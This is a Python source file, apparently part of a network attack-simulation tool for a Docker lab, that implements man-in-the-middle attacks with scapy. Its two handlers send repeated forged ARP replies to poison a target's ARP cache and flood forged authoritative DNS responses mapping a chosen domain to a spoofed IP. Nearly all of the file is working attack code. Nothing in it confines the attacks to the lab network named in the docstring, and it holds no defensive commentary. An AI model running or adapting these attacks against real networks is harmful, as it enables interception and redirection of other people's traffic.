"""
MITM attack module — ARP spoofing, DNS poisoning.

These attacks manipulate the Docker virtual network's ARP/DNS tables.
"""

from __future__ import annotations

import logging
import time

from scapy.all import (
    IP, UDP, DNS, DNSRR, DNSQR,
    Ether, ARP,
    send, sendp, get_if_addr, getmacbyip, conf,
)

log = logging.getLogger(__name__)

HANDLERS = {}


def _register(name):
    def decorator(fn):
        HANDLERS[name] = fn
        return fn
    return decorator


def run_attack(
    sub_type: str,
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    handler = HANDLERS.get(sub_type)
    if handler is None:
        raise ValueError(f"Unknown MITM sub_type: {sub_type!r}")
    return handler(target_ip, target_port, duration, rate_multiplier, params)


# ── ARP Spoofing ─────────────────────────────────────────

@_register("arp_spoof")
def arp_spoof(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """
    ARP cache poisoning — send gratuitous ARP replies claiming our MAC
    is the target gateway. On Docker virtual network this poisons the
    container's ARP table.
    """
    interval = params.get("interval", 2) / max(rate_multiplier, 0.1)
    # Discover our own IP as the "gateway" to impersonate
    our_ip = get_if_addr(conf.iface)
    our_mac = Ether().src

    log.info(
        "ARP spoof: claiming %s is at %s (our MAC) to target %s, interval=%.1fs",
        our_ip, our_mac, target_ip, interval,
    )

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        # Tell target that our_ip (gateway) is at our MAC
        arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op="is-at",
            psrc=our_ip,
            hwsrc=our_mac,
            pdst=target_ip,
        )
        sendp(arp_reply, verbose=False)
        packets_sent += 1
        time.sleep(interval)

    return {"packets_sent": packets_sent, "attack": "arp_spoof"}


# ── DNS Poisoning ────────────────────────────────────────

@_register("dns_poison")
def dns_poison(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """
    DNS response spoofing — send forged DNS responses mapping a domain
    to a spoofed IP. Targets port 53 on the victim.
    """
    domain = params.get("domain", "example.com")
    spoofed_ip = params.get("spoofed_ip", "10.0.0.99")
    base_rate = 50
    pps = int(base_rate * rate_multiplier)

    if not domain.endswith("."):
        domain += "."

    log.info(
        "DNS poison: %s → %s sent to %s at ~%d pps for %.0fs",
        domain, spoofed_ip, target_ip, pps, duration,
    )

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        # Forge a DNS response
        pkt = (
            IP(dst=target_ip) /
            UDP(sport=53, dport=RandDNSPort()) /
            DNS(
                qr=1,  # response
                aa=1,  # authoritative
                qd=DNSQR(qname=domain),
                an=DNSRR(rrname=domain, rdata=spoofed_ip, ttl=300),
            )
        )
        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {
        "packets_sent": packets_sent,
        "attack": "dns_poison",
        "domain": domain.rstrip("."),
        "spoofed_ip": spoofed_ip,
    }


def RandDNSPort():
    """Random high port for the 'client' side of DNS."""
    import random
    return random.randint(1024, 65535)
